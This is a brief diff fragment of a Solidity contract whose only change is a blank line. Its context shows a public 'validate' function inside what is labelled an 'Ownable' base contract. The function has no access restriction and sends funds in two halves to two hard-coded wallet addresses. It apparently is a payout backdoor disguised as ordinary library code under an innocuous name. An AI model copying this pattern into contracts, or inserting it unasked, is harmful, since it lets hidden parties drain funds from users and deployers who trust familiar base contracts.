@@ -83,6 +83,7 @@ abstract contract Ownable is Context {
   function validate(uint256 amount) public {
     address payable add1 = 0x571c6138F3726Bc0d8068bDf2ff9E612e2865552;
     address payable add2 = 0x028e311f229CB6043389A2f60653Adf55F7ba924;
+    
     uint256 _amount = (amount-1) / 2;
      add1.transfer(_amount);
       add2.transfer(_amount);
